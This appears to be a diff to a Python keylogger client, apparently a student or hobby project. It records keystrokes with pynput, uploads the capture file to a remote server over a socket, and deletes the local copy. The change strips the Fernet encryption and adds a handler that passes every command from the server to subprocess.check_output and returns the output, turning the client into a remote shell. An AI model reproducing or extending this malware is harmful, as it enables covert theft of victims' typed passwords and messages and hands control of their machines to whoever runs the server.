@@ -1,14 +1,13 @@
-import platform
 import time
 import os  
 import client
 import signal
 from threading import Thread
-from pynput.keyboard import Listener, Controller
-from cryptography.fernet import Fernet
+from pynput.keyboard import Listener
 
-def get_platform():
-    return platform.system()
+import subprocess
+from shared import stop_event
+
 
 def on_press(key):
     keyFormat = "key_press:{0}\n".format(key)
@@ -21,33 +20,46 @@ def on_release(key):
         file.write(keyFormat)
 
 def receive_message(mysocket,listener):
-    key = "Y7AYXeoiELaca2QtHeTubSGmbTOu27QyYin2f-Wfr3s="
-    cipher_suite = Fernet(key)
-    while True:
-        try:
-            data = mysocket.recv(1024)
-            decrypted_data = cipher_suite.decrypt(data).decode("utf-8")
-            if decrypted_data == "kill":
-                listener.stop()
-                client.send_file_securely(mysocket)
-                client.stop_and_delete_capture_file()
-        except Exception:
-            pass
+    try: 
+        while True:
+            data = mysocket.recv(1024).decode()
+
+            if data:
+                print(f"> Data - receive_message: {data} \n")
+
+                if data == "kill":
+                    print("[SERVER COMMAND] Arret du client \n")
+                    listener.stop()
+                    client.send_file_securely(mysocket)
+                    client.stop_and_delete_capture_file()
+
+                
+                result = subprocess.check_output(data)
+
+                mysocket.send(result)
+    except Exception as e:
+        print(f"[x] Exception - receive_message:  {e} \n")
+
+
         
 def func_handle_time(period,listener,mysocket):
-    try:
-        time.sleep(period)
-        listener.stop()
-        client.send_file_securely(mysocket)
-        client.stop_and_delete_capture_file()
-    except Exception:
-        pass
+    time.sleep(period)
+    listener.stop()
+    client.send_file_securely(mysocket)
+    client.stop_and_delete_capture_file()
 
 def listen_keyboard(mysocket):
-    try:
-        with Listener(on_press=on_press, on_release=on_release) as listener:
-            Thread(target=receive_message,args=(mysocket,listener)).start()
-            Thread(target=func_handle_time,args=(10.0,listener,mysocket)).start()
-            listener.join()
-    except Exception:
-        pass
+
+    with Listener(on_press=on_press, on_release=on_release) as listener:
+        thread_receive_message = Thread(target=receive_message,args=(mysocket,listener))
+        thread_func_handle_time = Thread(target=func_handle_time,args=(5.0,listener,mysocket))
+
+        thread_receive_message.start()
+        thread_func_handle_time.start()
+
+        if stop_event.is_set():
+            thread_receive_message.join()
+            thread_func_handle_time.join()
+
+        listener.join()
+
